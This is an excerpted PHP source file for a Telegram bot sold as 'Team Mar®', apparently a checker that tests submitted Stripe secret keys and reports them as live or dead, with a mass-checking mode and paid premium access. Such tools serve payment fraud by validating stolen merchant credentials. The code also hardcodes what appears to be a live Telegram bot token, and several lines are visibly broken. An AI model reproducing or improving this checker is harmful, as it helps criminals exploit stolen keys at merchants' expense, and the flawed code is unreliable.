...
Note-⟩ If you get any type of bugs in this bot please inform our team at @Sarcehkr</b>");
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot<Bottoken>/editMessageText?chat_id=$cchatid2&text=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
...
if ($cdata2 == "buy"){
    ...
    $keyboard = [
    'inline_keyboard' => [
         [['text' => 'Buy Now', 'url' => 'https://t.me/Sarcehkr'], 
         ['text' => 'Premium', 'callback_data' => 'paid'],
         ['text' => 'Finalize', 'callback_data' => 'end']]
        ]];
...
THIS BOT IS MADE WITH ♥️ BY  <code>@Sarcehkr</code> </b>",
 'parse_mode'=>'HTML',
 'reply_markup' => $free,
 ]);
        exit();
...
'inline_keyboard' => [
[['text' => "OWNER", 'url' => "https://t.me/Sarcehkr"],]
]]);
                $keyboard1 = json_encode([
'inline_keyboard' => [
[['text' => "CHANNEL", 'url' => "https://t.me/TeamMar®"],
['text' => "GROUP", 'url' => "https://t.me/TeamMar®"],]
]]);
...
// You Need To Join My Update Channel To Get Regular Updates
// 
 // Made With ♥️ By @Sarcehkr And @TM MAR®
// 
// USE /start AFTER JOIN",
 // 'parse_mode'=>'HTML',
 // 'reply_markup' =>  $keyboard1,
...
if(strpos($message, '!key') === 0 or strpos($message, '/key') === 0 or strpos($message, '.key') === 0){
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/Sarcehkr'],]]];
...
edit_message($chatId,$message_id_1,$keyboard, "<b>? DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot: @tmmarBot</b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
edit_message($chatId,$message_id_1,$keyboard, "<b>═════════ 『 Team Mar®』═════════%0A❌ DEAD KEY ❌</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot: @tmmarbot</b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
edit_message($chatId,$message_id_1,$keyboard, "<b>═════════ 『 Team Mar®』═════════%0A❌ DEAD KEY ❌</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot: @tmmarbot</b>");
}else{
edit_message($chatId,$message_id_1,$keyboard, "<b>═════════ 『 Team Mar® 』═════════%0A✅LIVE KEY✅</b>%0A<u>KEY:</u> <code>${fii}xxxxxxxxxxxxxxxxx${newstring}</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot: @tmmarbot</b>");
// sleep(10);
...
define('5533248257:AAHq24YqJ4FQMZW7GNrSTGFljIIXCb9vA_M',$botToken);
...
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot5533248257:AAHq24YqJ4FQMZW7GNrSTGFljIIXCb9vA_M".$method;
    $ch = curl_init();
...
function sendMessage1($message) {
        ...
        $url = $GLOBALS[website]."/sendMessage?chat_id=text=-1001720789753".$message."&parse_mode=HTML";
        file_get_contents($url);
...
global $botToken;
$url = "https://api.telegram.org/bot".$botToken."/editMessageText?chat_id=".$chatId."&message_id=".$message_id."&text=••MASS CHECKER%0A".$message."%0A••• BOT BY: @Sarcehkr&parse_mode=HTML";
...
<i>take group access from <code>@TeamMar®</code> to use here</i></b>");
